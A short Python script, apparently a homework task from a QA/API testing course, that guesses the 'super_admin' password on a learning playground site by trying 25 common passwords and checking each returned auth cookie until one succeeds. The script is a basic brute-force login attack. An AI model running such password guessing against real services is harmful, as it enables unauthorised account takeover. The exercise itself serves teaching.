import requests

PASS = ["123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345", "iloveyou", "111111", "123123",
        "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", "654321", "555555", "lovely", "7777777", "welcome",
        "888888", "princess", "dragon", "password1", "123qwe"]
URL_GET_COOKIE = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
URL_CHECK_COOKIE = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
LOGIN = "super_admin"

for pwd in PASS:
    payload = {"login": LOGIN, "password": pwd}
    response1 = requests.post(URL_GET_COOKIE, data=payload)
    cookie_value = response1.cookies.get('auth_cookie')
    cookies = response1.cookies
    response2 = requests.post(URL_CHECK_COOKIE, cookies=cookies)
    if response2.text != "You are NOT authorized":
        print(pwd)
        break
